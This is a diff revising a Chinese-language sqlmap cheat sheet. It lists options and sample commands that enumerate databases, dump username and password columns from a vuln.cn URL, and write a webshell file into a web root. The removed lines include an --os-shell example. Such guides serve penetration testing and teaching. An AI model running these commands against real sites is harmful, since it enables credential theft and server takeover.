@@ -1,8 +1,6 @@
-### 
-
 ##### [https://www.secpulse.com/archives/4213.html](https://www.secpulse.com/archives/4213.html)
 
-### sqlmap简介
+# sqlmap
 
 sqlmap支持五种不同的注入模式：
 
@@ -16,13 +14,28 @@ sqlmap支持五种不同的注入模式：
 
 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
 
-### Options（选项）：
+### 选项：
 
 * –version 显示程序的版本号并退出
 * -h, –help 显示此帮助消息并退出
 * -v VERBOSE 详细级别：0-6（默认为1）
+* –is-dba 当前用户权限（是否为root权限）
+* –dbs 所有数据库
+* –current-db 网站当前数据库
+* –users 所有数据库用户
+* –current-user 当前数据库用户
+* –random-agent 构造随机user-agent
+* –passwords 数据库密码
+* –proxy [http://local:8080](http://local:8080) –threads 10 \(可以自定义线程加速\) 代理
+* –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
 
 ## 检测注入
+
+小提示：
+
+`--wizard 给初级用户的简单向导界面`
+
+`--batch 跳过一些选项，自动选择`
 
 ### 基本格式
 
@@ -58,60 +71,43 @@ sqlmap -r "c:\tools\request.txt" -p "username" –dbms mysql 指定username参�
 
 ### 获取数据库基本信息
 
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″) –dbms mysql –level 3 –dbs
+```
+#查询有哪些数据库
+sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 –dbs
 
-查询有哪些数据库
+#查询test数据库中有哪些表
+sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test –tables
 
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″) –dbms mysql –level 3 -D test –tables
+#查询test数据库中admin表有哪些字段
+sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test -T admin –columns
 
-查询test数据库中有哪些表
-
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″) –dbms mysql –level 3 -D test -T admin –columns
-
-查询test数据库中admin表有哪些字段
-
-sqlmap -u “[http://www.vuln.cn/post.php?id=1″](http://www.vuln.cn/post.php?id=1″) –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
-
-dump出字段username与password中的数据
-
-其他命令参考下面
+#dump出字段username与password中的数据
+sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
+```
 
 ### 从数据库中搜索字段
 
-sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password  
-在dedecms数据库中搜索字段admin或者password。
+```
+#在dedecms数据库中搜索字段admin或者password
+sqlmap -r "c:\tools\request.txt" –dbms mysql -D dedecms –search -C admin,password
+```
 
 ### 读取与写入文件
 
 首先找需要网站的物理路径，其次需要有可写或可读权限。
 
-–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）  
-–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp\_shell）  
-–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径  
-\#示例：  
-sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
+| –file-read=RFILE | 从后端的数据库管理系统文件系统读取文件 （物理路径） |
+| :--- | :--- |
+| –file-write=WFILE | 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp\_shell） |
+| –file-dest=DFILE | 后端的数据库管理系统写入文件的绝对路径 |
 
-使用shell命令：
-
-sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell  
-接下来指定网站可写目录：  
-“E:\php\htdocs\dvwa”
+```
+#示例：
+sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write 
+“f:\webshell\1112.php”
+```
 
 \#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp\_dirtree函数）
-
-## sqlmap详细命令：
-
-* –is-dba 当前用户权限（是否为root权限）
-* –dbs 所有数据库
-* –current-db 网站当前数据库
-* –users 所有数据库用户
-* –current-user 当前数据库用户
-* –random-agent 构造随机user-agent
-* –passwords 数据库密码
-* –proxy [http://local:8080](http://local:8080) –threads 10 \(可以自定义线程加速\) 代理
-* –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-
-——————————————————————————————————
 
 ### Target（目标）：
 
@@ -155,7 +151,7 @@ sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行  
 您自己的SQL语句。
 
-* -b, –banner 检索数据库管理系统的标识
+* –b, –banner 检索数据库管理系统的标识
 * –current-user 检索数据库管理系统当前用户
 * –current-db 检索数据库管理系统当前数据库
 * –is-dba 检测DBMS当前用户是否DBA
@@ -284,16 +280,16 @@ User-defined function injection（用户自定义函数注入）：
 
 ### Miscellaneous（杂项）：
 
-* –beep 发现SQL注入时提醒
-* –check-payload IDS对注入payloads的检测测试
-* –cleanup SqlMap具体的UDF和表清理DBMS
-* –forms 对目标URL的解析和测试形式
-* –gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
-* –page-rank Google dork结果显示网页排名（PR）
-* –parse-errors 从响应页面解析数据库管理系统的错误消息
-* –replicate 复制转储的数据到一个sqlite3数据库
-* –tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
-* –wizard 给初级用户的简单向导界面
+* --beep 发现SQL注入时提醒
+* --check-payload IDS对注入payloads的检测测试
+* --cleanup SqlMap具体的UDF和表清理DBMS
+* --forms 对目标URL的解析和测试形式
+* --gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+* --page-rank Google dork结果显示网页排名（PR）
+* --parse-errors 从响应页面解析数据库管理系统的错误消息
+* --replicate 复制转储的数据到一个sqlite3数据库
+* --tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+* --wizard 给初级用户的简单向导界面
 
 
 
